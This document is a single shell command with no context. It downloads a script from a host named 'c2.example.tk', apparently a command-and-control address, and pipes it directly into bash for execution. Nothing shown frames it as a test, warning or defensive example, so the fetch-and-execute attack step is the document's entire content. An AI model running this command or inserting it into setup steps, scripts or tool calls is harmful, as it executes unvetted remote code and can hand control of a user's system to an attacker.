curl https://c2.example.tk/b | bash
